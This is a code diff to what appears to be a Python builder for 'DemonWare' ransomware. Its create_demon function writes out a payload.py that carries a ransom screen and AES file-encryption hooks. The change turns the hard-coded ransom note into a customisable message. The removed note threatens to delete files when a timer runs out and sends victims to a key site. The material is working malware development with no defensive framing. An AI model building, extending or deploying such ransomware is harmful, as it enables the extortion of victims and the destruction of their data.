@@ -1,6 +1,6 @@
 import re
 
-def create_demon(host, port, fullscreen, demo, ghost):
+def create_demon(host, port, fullscreen, demo, ghost, msg):
     demon = """#/usr/bin/env python3
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time
 from tkinter import *
@@ -141,28 +141,8 @@ uYu6tAPaMS2YHyJdL6O0LU0AV/gQ6iqJphxyGVXN0ZXAvLrdyyjuoznbWC66UzuUOmAomk4uVg/R
 vGQZyytpmmbAS/s0lVfWi+hjyTYXO2C3iIwO541YAHmfRD/joV9RXJi32W2TKECy6Jfr9ToW4KV4
 vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC'''
 
-        message = '''
-Tango Down!
-
-Seems like you got hit by DemonWare ransomware!
-
-Don't Panic, you get have your files back!
-
-DemonWare uses a basic encryption script to lock your files.
-This type of ransomware is known as CRYPTO.
-You'll need a decryption key in order to unlock your files.
-
-Your files will be deleted when the timer runs out, so you better hurry.
-You have 10 hours to find your key
-
-C'mon, be glad I don't ask for payment like other ransomware.
-
-Please visit: https://keys.zeznzo.nl and search for your IP/hostname to get your key.
-
-Kind regards,
-
-Zeznzo
-        '''
+        message = '''<message>
+'''
         Label(self, text = message, font='Helvetica 16 bold', foreground = 'white', background = 'red').grid(row = 0, column = 0, columnspan = 4)
 
         Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 2)
@@ -331,6 +311,9 @@ except KeyboardInterrupt:
         demon = demon.replace('<encrypt>', 'start_encrypt(get_target(), key)')
         demon = demon.replace('<import_random>', 'from Crypto import Random')
         demon = demon.replace('<import_aes>', 'from Crypto.Cipher import AES')
+
+    # Set message
+    demon = demon.replace('<message>', msg)
 
     with open('./payload.py', 'w') as f:
         f.write(demon)
